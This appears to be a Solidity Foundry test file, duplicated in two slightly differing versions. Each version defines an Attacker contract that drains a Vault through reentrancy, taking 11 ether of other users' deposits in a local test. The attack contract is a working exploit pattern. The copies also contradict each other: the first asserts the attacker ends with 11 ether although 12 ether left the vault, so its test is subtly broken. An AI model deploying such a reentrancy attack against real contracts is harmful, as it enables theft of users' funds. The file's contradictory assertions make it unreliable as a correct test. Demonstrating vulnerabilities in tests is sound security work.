// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/// @notice Malicious contract that re-enters withdraw() from receive().
contract Attacker {
    Vault public vault;
    uint256 public constant AMOUNT = 1 ether;
    uint256 public reentries;

    constructor(Vault _v) {
        vault = _v;
    }

    function attack() external payable {
        require(msg.value == AMOUNT, "need 1 ether");
        vault.deposit{value: AMOUNT}();
        vault.withdraw();
    }

    receive() external payable {
        // The vault has not zeroed our balance yet -> withdraw again.
        if (address(vault).balance >= AMOUNT) {
            reentries++;
            vault.withdraw();
        }
    }
}

contract VaultReentrancyTest is Test {
    Vault vault;
    Attacker attacker;

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(vault);
        // Honest users put money in the vault.
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        vm.deal(alice, 6 ether);
        vm.deal(bob, 5 ether);
        vm.prank(alice);
        vault.deposit{value: 6 ether}();
        vm.prank(bob);
        vault.deposit{value: 5 ether}();
    }

    function testReentrancyDrainsVault() public {
        // Vault holds 11 ether of honest users' money.
        assertEq(address(vault).balance, 11 ether);
        assertEq(vault.balanceOf(address(attacker)), 0);

        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        // Attacker only ever deposited 1 ether...
        // ...yet walked away with the whole 11 ether vault.
        // When the dust settles the attacker contract holds everything it pulled out,
        // minus nothing (the deposit came from the test harness).
        assertEq(address(vault).balance, 0, "vault not drained");
        assertGt(attacker.reentries(), 0, "no re-entry happened");
        // The price of one withdraw, repeated, is all of the vault:
        assertEq(address(attacker).balance, 11 ether, "attacker profit mismatch");
        // Honest users' balances are still recorded but unbacked.
        assertEq(vault.balanceOf(makeAddr("alice")), 6 ether);
        assertEq(vault.balanceOf(makeAddr("bob")), 5 ether);
        emit log_named_uint("vault drained to", address(vault).balance);
        emit log_named_uint("attacker balance", address(attacker).balance);
        emit log_named_uint("re-entries", attacker.reentries());
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/// @notice Malicious contract that re-enters withdraw() from receive().
contract Attacker {
    Vault public vault;
    uint256 public constant AMOUNT = 1 ether;
    uint256 public reentries;

    constructor(Vault _v) {
        vault = _v;
    }

    function attack() external payable {
        require(msg.value == AMOUNT, "need 1 ether");
        vault.deposit{value: AMOUNT}();
        vault.withdraw();
    }

    receive() external payable {
        // The vault has not zeroed our balance yet -> withdraw the same amount again.
        if (address(vault).balance >= AMOUNT) {
            reentries++;
            vault.withdraw();
        }
    }
}

contract VaultReentrancyTest is Test {
    Vault vault;
    Attacker attacker;

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(vault);
        // Honest users put money in the vault.
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        vm.deal(alice, 6 ether);
        vm.deal(bob, 5 ether);
        vm.prank(alice);
        vault.deposit{value: 6 ether}();
        vm.prank(bob);
        vault.deposit{value: 5 ether}();
    }

    function testReentrancyDrainsVault() public {
        // Vault holds 11 ether of honest users' money.
        assertEq(address(vault).balance, 11 ether);

        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        // The attacker only ever deposited 1 ether.
        // Each withdraw should pay out once, but the balance is still not zero,
        // so receive() calls withdraw() again and again until the vault is empty.
        assertGt(attacker.reentries(), 0, "no re-entry happened");
        assertEq(address(vault).balance, 0, "vault not drained");

        // Attacker got the whole vault back: 12 ether out for 1 ether in.
        assertEq(address(attacker).balance, 12 ether, "attacker did not get all funds");
        uint256 profit = address(attacker).balance - 1 ether;
        assertEq(profit, 11 ether, "profit should equal honest deposits");

        // Honest users still have balances recorded, but they are unbacked.
        assertEq(vault.balanceOf(makeAddr("alice")), 6 ether);
        assertEq(vault.balanceOf(makeAddr("bob")), 5 ether);
        emit log_named_uint("vault drained to", address(vault).balance);
        emit log_named_uint("attacker balance", address(attacker).balance);
        emit log_named_uint("attacker net profit", profit);
        emit log_named_uint("re-entries", attacker.reentries());
    }
}

